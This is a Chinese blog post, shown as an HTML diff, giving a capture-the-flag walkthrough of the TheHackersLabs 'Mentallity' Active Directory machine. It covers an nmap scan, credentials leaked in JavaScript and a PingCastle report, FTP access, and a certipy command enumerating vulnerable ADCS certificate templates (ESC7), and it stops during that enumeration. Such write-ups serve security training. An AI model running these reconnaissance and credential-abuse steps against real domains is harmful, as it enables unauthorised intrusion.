@@ -1,0 +1,345 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>thehackerslabs-Mentallity | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"ta0.fun","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="端口扫描root@kali2 [&#x2F;tmp] ➜  nmap -sV -A -p21,53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8080,9389,47001,49664,49665,49666,49667,49668,49670,49691,49692,49697,49703,49714,49743,64988 192.168.56.2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thehackerslabs-Mentallity">
+<meta property="og:url" content="http://ta0.fun/posts/d94b1923/index.html">
+<meta property="og:site_name" content="ta0的小站">
+<meta property="og:description" content="端口扫描root@kali2 [&#x2F;tmp] ➜  nmap -sV -A -p21,53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8080,9389,47001,49664,49665,49666,49667,49668,49670,49691,49692,49697,49703,49714,49743,64988 192.168.56.2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190411129.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190505180.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190518459.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190539223.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190625233.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190701058.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190706787.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190823847.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727191033505.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727192649221.png">
+<meta property="article:published_time" content="2025-07-27T13:09:38.872Z">
+<meta property="article:modified_time" content="2025-07-27T13:11:55.445Z">
+<meta property="article:author" content="ta0">
+<meta property="article:tag" content="ESC7">
+<meta property="article:tag" content="ADCS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190411129.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container sidebar-open"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">138</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">29</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">210</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><!-- 友链按钮并排放在社交区--><a class="links-of-author-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><!-- 黑暗模式按钮也并排--><a class="links-of-author-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text">web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FTP"><span class="toc-number">3.</span> <span class="toc-text">FTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ESC7"><span class="toc-number">4.</span> <span class="toc-text">ESC7</span></a></li></ol></div></div></div><!-- 侧边栏底部空白区域展示目录--><!-- 分类目录区域，所有分类默认收缩--><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://ta0.fun/posts/d94b1923/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">thehackerslabs-Mentallity</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-07-27 21:09:38" itemprop="dateCreated datePublished" datetime="2025-07-27T21:09:38+08:00">2025-07-27</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">1.9k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">11m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/thehackerlabs/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">thehackerlabs</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/ESC7/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">ESC7</span></a><a class="tag-item" href="/tags/ADCS/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">ADCS</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p21,53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8080,9389,47001,49664,49665,49666,49667,49668,49670,49691,49692,49697,49703,49714,49743,64988 <span class="token number">192.168</span>.56.28
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-07-27 <span class="token number">18</span>:39 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.28
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00061s latency<span class="token punctuation">)</span>.
+
+PORT      STATE SERVICE       VERSION
+<span class="token number">21</span>/tcp    <span class="token function">open</span>  <span class="token function">ftp</span>           Microsoft ftpd
+<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>VulnFTP
+<span class="token operator">|</span> Subject Alternative Name: DNS:VulnFTP
+<span class="token operator">|</span> Not valid before: <span class="token number">2025</span>-07-17T09:01:44
+<span class="token operator">|</span>_Not valid after:  <span class="token number">2026</span>-07-17T09:21:44
+<span class="token operator">|</span> ftp-syst: 
+<span class="token operator">|</span>_  SYST: Windows_NT
+<span class="token operator">|</span>_ssl-date: <span class="token number">2025</span>-07-27T10:41:08+00:00<span class="token punctuation">;</span> <span class="token parameter variable">-2s</span> from scanner time.
+<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain        Simple DNS Plus
+<span class="token number">80</span>/tcp    <span class="token function">open</span>  http          Microsoft IIS httpd <span class="token number">10.0</span>
+<span class="token operator">|</span> http-methods: 
+<span class="token operator">|</span>_  Potentially risky methods: TRACE
+<span class="token operator">|</span>_http-server-header: Microsoft-IIS/10.0
+<span class="token operator">|</span>_http-title: IIS Windows Server
+<span class="token number">88</span>/tcp    <span class="token function">open</span>  kerberos-sec  Microsoft Windows Kerberos <span class="token punctuation">(</span>server time: <span class="token number">2025</span>-07-27 <span class="token number">10</span>:40:03Z<span class="token punctuation">)</span>
+<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
+<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: mentality.thl0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
+<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
+<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>WIN-9FQTT7GPAVK.mentality.thl
+<span class="token operator">|</span> Subject Alternative Name: othername: <span class="token number">1.3</span>.6.1.4.1.311.25.1:<span class="token operator">&lt;</span>unsupported<span class="token operator">></span>, DNS:WIN-9FQTT7GPAVK.mentality.thl
+<span class="token operator">|</span> Not valid before: <span class="token number">2025</span>-07-17T13:49:22
+<span class="token operator">|</span>_Not valid after:  <span class="token number">2026</span>-07-17T13:49:22
+<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
+<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5?
+<span class="token number">593</span>/tcp   <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
+<span class="token number">636</span>/tcp   <span class="token function">open</span>  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: mentality.thl0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
+<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>WIN-9FQTT7GPAVK.mentality.thl
+<span class="token operator">|</span> Subject Alternative Name: othername: <span class="token number">1.3</span>.6.1.4.1.311.25.1:<span class="token operator">&lt;</span>unsupported<span class="token operator">></span>, DNS:WIN-9FQTT7GPAVK.mentality.thl
+<span class="token operator">|</span> Not valid before: <span class="token number">2025</span>-07-17T13:49:22
+<span class="token operator">|</span>_Not valid after:  <span class="token number">2026</span>-07-17T13:49:22
+<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
+<span class="token number">3268</span>/tcp  <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: mentality.thl0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
+<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
+<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>WIN-9FQTT7GPAVK.mentality.thl
+<span class="token operator">|</span> Subject Alternative Name: othername: <span class="token number">1.3</span>.6.1.4.1.311.25.1:<span class="token operator">&lt;</span>unsupported<span class="token operator">></span>, DNS:WIN-9FQTT7GPAVK.mentality.thl
+<span class="token operator">|</span> Not valid before: <span class="token number">2025</span>-07-17T13:49:22
+<span class="token operator">|</span>_Not valid after:  <span class="token number">2026</span>-07-17T13:49:22
+<span class="token number">3269</span>/tcp  <span class="token function">open</span>  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: mentality.thl0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
+<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
+<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>WIN-9FQTT7GPAVK.mentality.thl
+<span class="token operator">|</span> Subject Alternative Name: othername: <span class="token number">1.3</span>.6.1.4.1.311.25.1:<span class="token operator">&lt;</span>unsupported<span class="token operator">></span>, DNS:WIN-9FQTT7GPAVK.mentality.thl
+<span class="token operator">|</span> Not valid before: <span class="token number">2025</span>-07-17T13:49:22
+<span class="token operator">|</span>_Not valid after:  <span class="token number">2026</span>-07-17T13:49:22
+<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-title: Not Found
+<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+<span class="token number">8080</span>/tcp  <span class="token function">open</span>  http          Microsoft IIS httpd <span class="token number">10.0</span>
+<span class="token operator">|</span>_http-open-proxy: Proxy might be redirecting requests
+<span class="token operator">|</span>_http-server-header: Microsoft-IIS/10.0
+<span class="token operator">|</span>_http-title: Mentality <span class="token punctuation">\</span>xC2<span class="token punctuation">\</span>xB7 Innovating Beyond Limits
+<span class="token operator">|</span> http-methods: 
+<span class="token operator">|</span>_  Potentially risky methods: TRACE
+<span class="token number">9389</span>/tcp  <span class="token function">open</span>  mc-nmf        .NET Message Framing
+<span class="token number">47001</span>/tcp <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+<span class="token operator">|</span>_http-title: Not Found
+<span class="token number">49664</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49665</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49666</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49668</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49670</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49691</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49692</span>/tcp <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
+<span class="token number">49697</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49703</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49714</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49743</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">64988</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+MAC Address: 08:00:27:F3:7C:0F <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
+Device type: general purpose
+Running <span class="token punctuation">(</span>JUST GUESSING<span class="token punctuation">)</span>: Microsoft Windows <span class="token number">2016</span><span class="token operator">|</span><span class="token number">10</span><span class="token operator">|</span><span class="token number">7</span><span class="token operator">|</span><span class="token number">2012</span><span class="token operator">|</span><span class="token number">8.1</span><span class="token operator">|</span><span class="token number">2022</span><span class="token operator">|</span><span class="token number">2019</span><span class="token operator">|</span>Longhorn<span class="token operator">|</span>Vista<span class="token operator">|</span><span class="token number">2008</span> <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>
+OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10:1703 cpe:/o:microsoft:windows_7:::ultimate cpe:/o:microsoft:windows_2012 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2008:r2
+Aggressive OS guesses: Microsoft Windows Server <span class="token number">2016</span> build <span class="token number">10586</span> - <span class="token number">14393</span> <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>, Microsoft Windows <span class="token number">10</span> <span class="token number">1703</span> <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>, Microsoft Windows Server <span class="token number">2016</span> <span class="token punctuation">(</span><span class="token number">96</span>%<span class="token punctuation">)</span>, Microsoft Windows <span class="token number">10</span> <span class="token number">1507</span> - <span class="token number">1607</span> <span class="token punctuation">(</span><span class="token number">94</span>%<span class="token punctuation">)</span>, Microsoft Windows <span class="token number">7</span>, Windows Server <span class="token number">2012</span>, or Windows <span class="token number">8.1</span> Update <span class="token number">1</span> <span class="token punctuation">(</span><span class="token number">94</span>%<span class="token punctuation">)</span>, Microsoft Windows <span class="token number">10</span> <span class="token number">1511</span> <span class="token punctuation">(</span><span class="token number">94</span>%<span class="token punctuation">)</span>, Microsoft Windows Server <span class="token number">2022</span> <span class="token punctuation">(</span><span class="token number">94</span>%<span class="token punctuation">)</span>, Microsoft Windows Server <span class="token number">2012</span> or Server <span class="token number">2012</span> R2 <span class="token punctuation">(</span><span class="token number">94</span>%<span class="token punctuation">)</span>, Microsoft Windows Server <span class="token number">2012</span> R2 Update <span class="token number">1</span> <span class="token punctuation">(</span><span class="token number">94</span>%<span class="token punctuation">)</span>, Microsoft Windows Server <span class="token number">2019</span> <span class="token punctuation">(</span><span class="token number">93</span>%<span class="token punctuation">)</span>
+No exact OS matches <span class="token keyword">for</span> <span class="token function">host</span> <span class="token punctuation">(</span>test conditions non-ideal<span class="token punctuation">)</span>.
+Network Distance: <span class="token number">1</span> hop
+Service Info: Host: WIN-9FQTT7GPAVK<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+<span class="token operator">|</span> smb2-security-mode: 
+<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
+<span class="token operator">|</span>_    Message signing enabled and required
+<span class="token operator">|</span> smb2-time: 
+<span class="token operator">|</span>   date: <span class="token number">2025</span>-07-27T10:40:59
+<span class="token operator">|</span>_  start_date: N/A
+<span class="token operator">|</span>_nbstat: NetBIOS name: WIN-9FQTT7GPAVK, NetBIOS user: <span class="token operator">&lt;</span>unknown<span class="token operator">></span>, NetBIOS MAC: 08:00:27:f3:7c:0f <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+<span class="token operator">|</span>_clock-skew: mean: -2s, deviation: 0s, median: <span class="token parameter variable">-2s</span>
+
+TRACEROUTE
+HOP RTT     ADDRESS
+<span class="token number">1</span>   <span class="token number">0.61</span> ms <span class="token number">192.168</span>.56.28
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">86.00</span> seconds</code></pre>
+
+<p><code>mentality.thl</code> <code>WIN-9FQTT7GPAVK.mentality.thl</code>添加到hosts</p>
+<p>FTP,SMB尝试无果，看到有个 web <code>8080</code></p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190411129.png" alt="image-20250727190411129" loading="lazy"></p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190505180.png" alt="image-20250727190505180" loading="lazy"></p>
+<p>有个<code>admin</code>目录</p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190518459.png" alt="image-20250727190518459" loading="lazy"></p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190539223.png" alt="image-20250727190539223" loading="lazy"></p>
+<p>查看js泄露了用户名和密码，登录</p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190625233.png" alt="image-20250727190625233" loading="lazy"></p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190701058.png" alt="image-20250727190701058" loading="lazy"></p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190706787.png" alt="image-20250727190706787" loading="lazy"></p>
+<p>拿到一组凭据<code>ftpuser:SuperSecret123$</code></p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727190823847.png" alt="image-20250727190823847" loading="lazy"></p>
+<p>可以登录</p>
+<p>根据用户名尝试登录ftp服务</p>
+<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><pre class="language-bash" data-language="bash"><code class="language-bash">ftp<span class="token operator">></span> <span class="token function">dir</span>
+<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">64034</span><span class="token operator">|</span><span class="token punctuation">)</span>
+<span class="token number">125</span> Data connection already <span class="token function">open</span><span class="token punctuation">;</span> Transfer starting.
+07-17-25  08:52AM              <span class="token number">1608612</span> ad_hc_mentality_htl.html
+07-17-25  05:48AM                   <span class="token number">34</span> flag.txt
+07-17-25  <span class="token number">12</span>:13AM                   <span class="token number">75</span> web.config
+<span class="token number">226</span> Transfer complete.</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span>
+└─<span class="token comment"># cat flag.txt  </span>
+FLAG<span class="token punctuation">&#123;</span>this_is_a_test_flag_for_ftp<span class="token punctuation">&#125;</span></code></pre>
+
+<p>不知道是不是fake的</p>
+<p><code>ad_hc_mentality_htl.html</code>是一个<code>PingCastle</code>扫描结果</p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727191033505.png" alt="image-20250727191033505" loading="lazy"></p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250727192649221.png" alt="image-20250727192649221" loading="lazy"></p>
+<p>存在<code>svcapp1/Hola1234$</code></p>
+<p>发现也无法rpc，扫一下ADCS</p>
+<h2 id="ESC7"><a href="#ESC7" class="headerlink" title="ESC7"></a>ESC7</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># certipy-ad find -u svcapp1@mentality.thl -p 'Hola1234$' -dc-ip 192.168.56.28 -vulnerable -stdout -debug</span>
+Certipy v4.8.2 - by Oliver Lyak <span class="token punctuation">(</span>ly4k<span class="token punctuation">)</span>
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Authenticating to LDAP server
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Bound to ldaps://192.168.56.28:636 - ssl
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Default path: <span class="token assign-left variable">DC</span><span class="token operator">=</span>mentality,DC<span class="token operator">=</span>thl
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Configuration path: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>mentality,DC<span class="token operator">=</span>thl
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Adding Domain Computers to list of current user<span class="token string">'s SIDs
+[+] List of current user'</span>s SIDs:
+     MENTALITY.THL<span class="token punctuation">\</span>Domain Computers <span class="token punctuation">(</span>S-1-5-21-1896710242-59548724-504912181-515<span class="token punctuation">)</span>
+     MENTALITY.THL<span class="token punctuation">\</span>Users <span class="token punctuation">(</span>MENTALITY.THL-S-1-5-32-545<span class="token punctuation">)</span>
+     MENTALITY.THL<span class="token punctuation">\</span>svcapp1 <span class="token punctuation">(</span>S-1-5-21-1896710242-59548724-504912181-1102<span class="token punctuation">)</span>
+     MENTALITY.THL<span class="token punctuation">\</span>Domain Users <span class="token punctuation">(</span>S-1-5-21-1896710242-59548724-504912181-513<span class="token punctuation">)</span>
+     MENTALITY.THL<span class="token punctuation">\</span>Authenticated Users <span class="token punctuation">(</span>MENTALITY.THL-S-1-5-11<span class="token punctuation">)</span>
+     MENTALITY.THL<span class="token punctuation">\</span>Everyone <span class="token punctuation">(</span>MENTALITY.THL-S-1-1-0<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Finding certificate templates
